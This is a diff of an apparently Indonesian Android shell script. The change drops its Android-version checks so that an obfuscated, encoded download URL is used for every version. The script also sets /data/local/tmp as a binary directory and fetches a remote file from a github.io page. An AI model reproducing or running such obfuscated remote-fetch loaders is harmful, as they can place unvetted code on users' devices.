@@ -32,18 +32,9 @@ t2LmsNWgsz9zrN4mQd96POx="
 elif [[ $android_version == 11* ]]; then
     url="r17rYI0tYD6Cp9pPOtlQ2c0rYMzuOEctdEmseIcseHlP29kC0ycsbA6DKSJQNWjC3ElvUVotdMqtX9l
 t2LmsNWgsz9zrN4mQd96POx="
-elif [[ $android_version == 10* ]]; then
-    url="r17rYI0tYD6Cp9pPOtlQ2c0rYMzuOEctdEmseIcseHlP29kC0ycsbA6DKSJQNWjC3ElvUVotdMqtX9l
-t2LmsNWgsz9zrN4mQd96POxqDx=="
-elif [[ $android_version == 9* ]]; then
-    url="r17rYI0tYD6Cp9pPOtlQ2c0rYMzuOEctdEmseIcseHlP29kC0ycsbA6DKSJQNWjC3ElvUVotdMqtX9l
-t2LmsNWgsz9zrN4mQd96POxqDx=="
-elif [[ $android_version == 8* ]]; then
-    url="r17rYI0tYD6Cp9pPOtlQ2c0rYMzuOEctdEmseIcseHlP29kC0ycsbA6DKSJQNWjC3ElvUVotdMqtX9l
-t2LmsNWgsz9zrN4mQd96POxqDx=="
 else
-    echo "Versi Android tidak didukung."
-    exit 1
+    url="r17rYI0tYD6Cp9pPOtlQ2c0rYMzuOEctdEmseIcseHlP29kC0ycsbA6DKSJQNWjC3ElvUVotdMqtX9l
+t2LmsNWgsz9zrN4mQd96POxqDx=="
 fi
 local bin="/data/local/tmp/"
 local check_id=$(storm "https://henbz10real.github.io/snx11response/function/fozaxid.txt")
